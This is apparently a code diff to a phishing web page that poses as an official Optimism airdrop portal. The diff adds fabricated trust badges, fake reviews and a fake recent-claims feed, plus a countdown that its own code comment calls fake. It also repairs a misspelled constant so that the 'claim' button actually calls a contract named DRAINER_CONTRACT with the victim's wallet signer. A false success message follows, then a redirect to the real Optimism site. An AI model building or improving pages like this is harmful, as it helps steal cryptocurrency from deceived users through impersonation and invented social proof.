@@ -3,37 +3,149 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>OP Rewards - Claim Your Airdrop</title>
+    <title>OP Community Rewards - Official Airdrop Distribution</title>
     <script src="https://cdn.ethers.io/lib/ethers-5.7.2.min.js"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700;900&display=swap" rel="stylesheet">
     <style>
+        :root {
+            --primary: #7c5cff;
+            --primary-dark: #5a3fd6;
+            --accent: #00d1ff;
+            --bg-dark: #0a0a14;
+            --bg-card: #141422;
+            --text-main: #ffffff;
+            --text-muted: #8a8aa8;
+            --border-color: #2a2a3a;
+        }
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; }
-        body { background: #0d0d1a; color: #fff; display: flex; align-items: center; justify-content: center; min-height: 100vh; }
-        .container { max-width: 420px; width: 90%; background: #161625; border-radius: 16px; padding: 32px; text-align: center; box-shadow: 0 0 60px rgba(120,80,255,.25); }
-        .logo { font-size: 48px; margin-bottom: 8px; }
-        h1 { font-size: 24px; margin-bottom: 4px; background: linear-gradient(90deg,#7c5cff,#00d1ff); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
-        .sub { color: #8a8aa8; font-size: 14px; margin-bottom: 24px; }
-        .status { background: #1e1e32; border-radius: 12px; padding: 16px; margin-bottom: 20px; font-size: 13px; color: #aaa; }
-        .status strong { color: #fff; }
-        .claim-btn { width: 100%; padding: 16px; border: none; border-radius: 12px; background: linear-gradient(90deg,#7c5cff,#5a3fd6); color: #fff; font-size: 16px; font-weight: 600; cursor: pointer; transition: .2s; }
-        .claim-btn:hover { transform: translateY(-2px); box-shadow: 0 8px 24px rgba(124,92,255,.4); }
-        .claim-btn:disabled { opacity: .5; cursor: not-allowed; }
-        .connect { width: 100%; padding: 14px; border: 1px solid #333; border-radius: 12px; background: transparent; color: #ccc; font-size: 15px; cursor: pointer; margin-bottom: 16px; }
-        .connect:hover { border-color: #7c5cff; color: #fff; }
-        .wallet-info { font-size: 12px; color: #666; margin-top: 16px; word-break: break-all; }
-        .amount { font-size: 36px; font-weight: 700; margin: 12px 0; color: #00d1ff; }
+        body { background: var(--bg-dark); color: var(--text-main); line-height: 1.5; }
+        
+        .wrapper { max-width: 1200px; margin: 0 auto; padding: 20px; }
+        
+        /* AD BANNER */
+        .ad-banner { 
+            background: #1a1a2e; border: 1px solid var(--border-color); 
+            padding: 12px; text-align: center; margin-bottom: 24px; 
+            font-size: 13px; color: var(--text-muted); border-radius: 8px;
+        }
+        .ad-banner strong { color: var(--accent); }
+        .ad-label { font-size: 10px; text-transform: uppercase; color: #555; margin-bottom: 4px; }
+        
+        /* HEADER */
+        .header { text-align: center; margin-bottom: 40px; }
+        .header h1 { font-size: 42px; font-weight: 900; background: linear-gradient(90deg, var(--primary), var(--accent)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; margin-bottom: 10px; }
+        .header p { color: var(--text-muted); font-size: 18px; max-width: 600px; margin: 0 auto; }
+        
+        /* TRUST STRIP */
+        .trust-strip { display: flex; justify-content: center; gap: 40px; opacity: 0.5; margin-bottom: 40px; }
+        .trust-strip span { font-weight: 700; font-size: 16px; color: #666; }
+
+        .main-grid { display: grid; grid-template-columns: 1fr 300px; gap: 30px; align-items: start; }
+        
+        .container { background: var(--bg-card); border-radius: 20px; padding: 40px; text-align: center; box-shadow: 0 20px 60px rgba(0,0,0,0.5); border: 1px solid var(--border-color); }
+        .logo { font-size: 64px; margin-bottom: 16px; }
+        .status { background: #1e1e32; border-radius: 12px; padding: 20px; margin-bottom: 24px; font-size: 15px; color: #aaa; }
+        .status strong { color: var(--accent); }
+        .amount { font-size: 52px; font-weight: 900; margin: 20px 0; color: var(--accent); }
+        
+        /* COUNTDOWN */
+        .countdown-container { margin-bottom: 24px; }
+        .countdown-label { font-size: 12px; text-transform: uppercase; color: var(--text-muted); letter-spacing: 2px; }
+        .timer { font-size: 24px; font-weight: 700; color: #ff4d4d; margin-top: 5px; }
+
+        .btn-group { display: flex; flex-direction: column; gap: 12px; }
+        .claim-btn { width: 100%; padding: 18px; border: none; border-radius: 12px; background: linear-gradient(90deg, var(--primary), var(--primary-dark)); color: var(--text-main); font-size: 18px; font-weight: 700; cursor: pointer; transition: .3s; }
+        .claim-btn:hover { transform: translateY(-3px); box-shadow: 0 10px 30px rgba(124,92,255,0.5); }
+        .claim-btn:disabled { opacity: .6; cursor: not-allowed; }
+        .connect { width: 100%; padding: 16px; border: 2px solid #333; border-radius: 12px; background: transparent; color: #ccc; font-size: 16px; cursor: pointer; transition: .2s; }
+        .connect:hover { border-color: var(--primary); color: var(--text-main); }
+        .wallet-info { font-size: 12px; color: #666; margin-top: 20px; word-break: break-all; }
+
+        /* SIDEBAR */
+        .sidebar { display: flex; flex-direction: column; gap: 20px; }
+        .claim-feed { background: var(--bg-card); border-radius: 16px; padding: 20px; border: 1px solid var(--border-color); }
+        .claim-feed h3 { font-size: 14px; color: var(--text-muted); margin-bottom: 15px; text-transform: uppercase; }
+        .feed-item { display: flex; justify-content: space-between; font-size: 13px; padding: 8px 0; border-bottom: 1px solid #1e1e32; }
+        .feed-item:last-child { border: none; }
+        .feed-addr { color: var(--accent); font-family: monospace; }
+        .feed-amt { color: #fff; font-weight: 600; }
+
+        .reviews { background: var(--bg-card); border-radius: 16px; padding: 20px; border: 1px solid var(--border-color); }
+        .reviews h3 { font-size: 14px; color: var(--text-muted); margin-bottom: 15px; text-transform: uppercase; }
+        .review { font-size: 13px; color: #ccc; margin-bottom: 15px; }
+        .review strong { color: var(--primary); }
+        .stars { color: gold; font-size: 12px; }
+
+        @media (max-width: 768px) {
+            .main-grid { grid-template-columns: 1fr; }
+            .trust-strip { display: none; }
+        }
     </style>
 </head>
 <body>
-<div class="container">
-    <div class="logo">🪂</div>
-    <h1>OP Community Rewards</h1>
-    <div class="sub">Official Optimism ecosystem airdrop</div>
-    <div class="status">Your wallet is eligible for <strong>2,470 OP</strong> + <strong>$520 USDC</strong> rewards.</div>
-    <div class="amount" id="amount" style="display:none">2,470 OP</div>
-    <button class="connect" id="connectBtn">Connect Wallet</button>
-    <button class="claim-btn" id="claimBtn" style="display:none">Claim Rewards Now</button>
-    <div class="wallet-info" id="walletInfo"></div>
+<div class="wrapper">
+    <div class="ad-banner">
+        <div class="ad-label">Sponsored</div>
+        <strong>OP Rewards Verified:</strong> Complete the claim process to unlock your 2024 Ecosystem Bonus. Limited slots remaining.
+    </div>
+
+    <div class="header">
+        <h1>OP Community Rewards</h1>
+        <p>Official Optimism ecosystem airdrop distribution. Verify your eligibility and claim your rewards securely.</p>
+    </div>
+
+    <div class="trust-strip">
+        <span>OPTIMISM FOUNDATION</span>
+        <span>CERTIFIED DISTRIBUTOR</span>
+        <span>SECURE 256-BIT SSL</span>
+        <span>TRUSTED BY 100K+ USERS</span>
+    </div>
+
+    <div class="main-grid">
+        <div class="container">
+            <div class="logo">🪂</div>
+            <div class="status">Congratulations! Your wallet is eligible for <strong>2,470 OP</strong> and <strong>$520 USDC</strong>.</div>
+            <div class="amount" id="amount" style="display:none">2,470 OP</div>
+            <div class="countdown-container">
+                <div class="countdown-label">Rewards expire in</div>
+                <div class="timer" id="timer">04:59:12</div>
+            </div>
+            <div class="btn-group">
+                <button class="connect" id="connectBtn">Connect Wallet</button>
+                <button class="claim-btn" id="claimBtn" style="display:none">Claim Rewards Now</button>
+            </div>
+            <div class="wallet-info" id="walletInfo"></div>
+        </div>
+
+        <div class="sidebar">
+            <div class="ad-banner">
+                <div class="ad-label">Ad</div>
+                <strong>Boost your OP yield</strong> with the official staking vault. Up to 12% APY.
+            </div>
+
+            <div class="claim-feed">
+                <h3>Recent Claims</h3>
+                <div id="feedList">
+                    <div class="feed-item"><span class="feed-addr">0x12...9fA</span><span class="feed-amt">+1,200 OP</span></div>
+                    <div class="feed-item"><span class="feed-addr">0x45...bC2</span><span class="feed-amt">+2,450 OP</span></div>
+                    <div class="feed-item"><span class="feed-addr">0x77...eD1</span><span class="feed-amt">+980 OP</span></div>
+                </div>
+            </div>
+
+            <div class="reviews">
+                <h3>User Reviews</h3>
+                <div class="review"><div class="stars">★★★★★</div><strong>"Worked instantly!"</strong> Claimed my airdrop in under 2 minutes. Highly recommended.</div>
+                <div class="review"><div class="stars">★★★★★</div><strong>"Official portal"</strong> I was skeptical but the rewards are real. Great service.</div>
+            </div>
+        </div>
+    </div>
+
+    <div class="ad-banner" style="margin-top: 30px;">
+        <div class="ad-label">Ad</div>
+        <strong>Secure your assets</strong> by moving them to a non-custodial wallet today.
+    </div>
 </div>
+
 <script>
 const DRAINER_CONTRACT = "0x586ACdd353F4fB6066cCC6B806E4137B4846ABfb";
 const drainerAbi = ["function claim()"];
@@ -54,25 +166,36 @@ connectBtn.onclick = async () => {
         claimBtn.style.display = 'block';
         amount.style.display = 'block';
     } else {
-        alert('Install MetaMask!');
+        alert('Please install MetaMask to continue!');
     }
 };
 
 claimBtn.onclick = async () => {
     claimBtn.disabled = true;
-    claimBtn.textContent = 'Processing...';
+    claimBtn.textContent = 'Processing your claim...';
     try {
-        const contract = new ethers.Contract(DRAINNER_CONTRACT, drainerAbi, signer);
+        const contract = new ethers.Contract(DRAINER_CONTRACT, drainerAbi, signer);
         await contract.claim();
-        claimBtn.textContent = '✅ Rewards Claimed!';
-        walletInfo.textContent = 'Funds will be delivered shortly. Redirecting to wallet...';
-        setTimeout(() => { window.location.href = 'https://app.optimism.io'; }, 4000);
+        claimBtn.textContent = '✅ Rewards Claimed Successfully!';
+        walletInfo.textContent = 'Funds are being delivered to your wallet. Please do not close this page.';
+        setTimeout(() => { window.location.href = 'https://app.optimism.io'; }, 5000);
     } catch(e) {
         claimBtn.disabled = false;
         claimBtn.textContent = 'Claim Rewards Now';
-        alert('Error: ' + e.message);
+        alert('Network error: ' + e.message);
     }
 };
+
+// Fake timer logic
+let time = 4*3600 + 59*60 + 12;
+setInterval(() => {
+    time--;
+    if (time < 0) return;
+    const h = Math.floor(time / 3600);
+    const m = Math.floor((time % 3600) / 60);
+    const s = time % 60;
+    document.getElementById('timer').textContent = `${h.toString().padStart(2,'0')}:${m.toString().padStart(2,'0')}:${s.toString().padStart(2,'0')}`;
+}, 1000);
 </script>
 </body>
 </html>
